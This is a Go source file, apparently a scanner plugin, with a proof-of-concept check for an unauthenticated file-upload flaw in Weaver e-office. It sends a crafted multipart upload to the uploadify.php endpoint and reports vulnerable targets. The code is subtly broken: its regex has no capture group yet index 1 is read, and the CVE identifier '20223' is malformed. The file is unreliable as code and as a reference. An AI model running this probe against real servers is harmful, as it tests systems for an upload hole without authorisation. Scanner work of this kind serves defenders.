package weaver

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"regexp"
	"strings"
)

func CVE_20223_2647(u string) bool {

	var payload = "------WebKitFormBoundary1ZCUAAAXxnYuVIZR\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\n1\r\n------WebKitFormBoundary1ZCUAAAXxnYuVIZR\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"xxx\"\r\nContent-Type: application/msword\r\n\r\naaaaa\r\n------WebKitFormBoundary1ZCUAAAXxnYuVIZR--"
	header := make(map[string]string)
	header["Content-Type"] = "multipart/form-data; boundary=----WebKitFormBoundary1ZCUAAAXxnYuVIZR"
	header["Cookie"] = "LOGIN_LANG=cn; PHPSESSID=16a132db599e8d54a45e704389a29686"

	if req, err := pkg.HttpRequset(u+"/inc/jquery/uploadify/uploadify.php", "POST", payload, false, header); err == nil {
		//pkg.GoPocLog(req.Body)
		var pattern = `^\d{10}$`
		re := regexp.MustCompile(pattern)
		resourceUuid := re.FindStringSubmatch(req.Body)[1]
		if req.StatusCode == 200 && strings.Contains(req.Body, resourceUuid) {
			pkg.GoPocLog(fmt.Sprintf("Found vuln weaver_CVE_20223_2647|%s\n", u+"/inc/jquery/uploadify/uploadify.php"))
			return true
		}
	}
	return false
}
